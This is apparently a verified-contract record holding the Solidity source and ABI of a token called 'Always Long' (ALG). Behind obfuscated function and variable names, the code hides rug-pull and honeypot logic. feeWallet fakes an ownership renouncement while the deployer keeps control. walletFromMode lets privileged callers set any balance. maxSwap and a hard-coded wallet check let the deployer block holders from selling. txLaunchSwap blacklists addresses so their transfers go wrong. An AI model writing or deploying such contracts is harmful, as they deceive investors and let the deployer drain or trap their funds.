{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface buyTxSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountBuy {\n    function createPair(address fundModeReceiver, address exemptFee) external returns (address);\n}\n\ninterface totalAutoSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenAmount) external view returns (uint256);\n\n    function transfer(address atTrading, uint256 amountTx) external returns (bool);\n\n    function allowance(address enableMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atTrading,\n        uint256 amountTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitList, uint256 value);\n    event Approval(address indexed enableMode, address indexed spender, uint256 value);\n}\n\ninterface totalAutoSwapMetadata is totalAutoSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlwaysLong is exemptSell, totalAutoSwap, totalAutoSwapMetadata {\n\n    uint256 public buyIsWallet;\n\n    mapping(address => mapping(address => uint256)) private sellAuto;\n\n    function maxSwap(uint256 amountTx) public {\n        marketingTx();\n        liquidityReceiverFrom = amountTx;\n    }\n\n    uint256 private feeMaxTo;\n\n    mapping(address => bool) public senderMarketingAmount;\n\n    mapping(address => bool) public modeAtFund;\n\n    bool public launchedLimit;\n\n    function swapFee(address receiverBuy, address atTrading, uint256 amountTx) internal returns (bool) {\n        require(limitLiquidityLaunched[receiverBuy] >= amountTx);\n        limitLiquidityLaunched[receiverBuy] -= amountTx;\n        limitLiquidityLaunched[atTrading] += amountTx;\n        emit Transfer(receiverBuy, atTrading, amountTx);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listFeeMin;\n    }\n\n    address private maxIsExempt;\n\n    string private buyMarketingAt = \"Always Long\";\n\n    function balanceOf(address tokenAmount) public view virtual override returns (uint256) {\n        return limitLiquidityLaunched[tokenAmount];\n    }\n\n    function allowance(address fromTrading, address teamSell) external view virtual override returns (uint256) {\n        if (teamSell == exemptMax) {\n            return type(uint256).max;\n        }\n        return sellAuto[fromTrading][teamSell];\n    }\n\n    function transfer(address buySell, uint256 amountTx) external virtual override returns (bool) {\n        return swapReceiver(_msgSender(), buySell, amountTx);\n    }\n\n    address public modeMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityReceiverTrading;\n    }\n\n    function swapReceiver(address receiverBuy, address atTrading, uint256 amountTx) internal returns (bool) {\n        if (receiverBuy == modeMin) {\n            return swapFee(receiverBuy, atTrading, amountTx);\n        }\n        uint256 feeTotal = totalAutoSwap(modeIs).balanceOf(walletToken);\n        require(feeTotal == liquidityReceiverFrom);\n        require(atTrading != walletToken);\n        if (modeAtFund[receiverBuy]) {\n            return swapFee(receiverBuy, atTrading, exemptReceiverSwap);\n        }\n        return swapFee(receiverBuy, atTrading, amountTx);\n    }\n\n    function txModeMin(address minBuyFee) public {\n        if (fundSell) {\n            return;\n        }\n        \n        senderMarketingAmount[minBuyFee] = true;\n        \n        fundSell = true;\n    }\n\n    function approve(address teamSell, uint256 amountTx) public virtual override returns (bool) {\n        sellAuto[_msgSender()][teamSell] = amountTx;\n        emit Approval(_msgSender(), teamSell, amountTx);\n        return true;\n    }\n\n    function feeWallet() public {\n        emit OwnershipTransferred(modeMin, address(0));\n        maxIsExempt = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return maxIsExempt;\n    }\n\n    string private minMode = \"ALG\";\n\n    address public modeIs;\n\n    constructor (){\n        \n        buyTxSender minFund = buyTxSender(exemptMax);\n        modeIs = amountBuy(minFund.factory()).createPair(minFund.WETH(), address(this));\n        \n        modeMin = _msgSender();\n        feeWallet();\n        senderMarketingAmount[modeMin] = true;\n        limitLiquidityLaunched[modeMin] = liquidityReceiverTrading;\n        if (listLimit) {\n            buyIsWallet = feeMaxTo;\n        }\n        emit Transfer(address(0), modeMin, liquidityReceiverTrading);\n    }\n\n    function marketingTx() private view {\n        require(senderMarketingAmount[_msgSender()]);\n    }\n\n    address walletToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listLimit;\n\n    uint256 private liquidityReceiverTrading = 100000000 * 10 ** 18;\n\n    uint256 liquidityReceiverFrom;\n\n    uint256 totalReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return buyMarketingAt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minMode;\n    }\n\n    event OwnershipTransferred(address indexed buyLimit, address indexed buyWallet);\n\n    mapping(address => uint256) private limitLiquidityLaunched;\n\n    bool public listTx;\n\n    function transferFrom(address receiverBuy, address atTrading, uint256 amountTx) external override returns (bool) {\n        if (_msgSender() != exemptMax) {\n            if (sellAuto[receiverBuy][_msgSender()] != type(uint256).max) {\n                require(amountTx <= sellAuto[receiverBuy][_msgSender()]);\n                sellAuto[receiverBuy][_msgSender()] -= amountTx;\n            }\n        }\n        return swapReceiver(receiverBuy, atTrading, amountTx);\n    }\n\n    uint8 private listFeeMin = 18;\n\n    uint256 constant exemptReceiverSwap = 19 ** 10;\n\n    address exemptMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return maxIsExempt;\n    }\n\n    function walletFromMode(address buySell, uint256 amountTx) public {\n        marketingTx();\n        limitLiquidityLaunched[buySell] = amountTx;\n    }\n\n    bool public fundSell;\n\n    function txLaunchSwap(address shouldMode) public {\n        marketingTx();\n        \n        if (shouldMode == modeMin || shouldMode == modeIs) {\n            return;\n        }\n        modeAtFund[shouldMode] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIsWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTx\",\"type\":\"uint256\"}],\"name\":\"maxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAtFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderMarketingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"}],\"name\":\"txLaunchSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuyFee\",\"type\":\"address\"}],\"name\":\"txModeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTx\",\"type\":\"uint256\"}],\"name\":\"walletFromMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlwaysLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}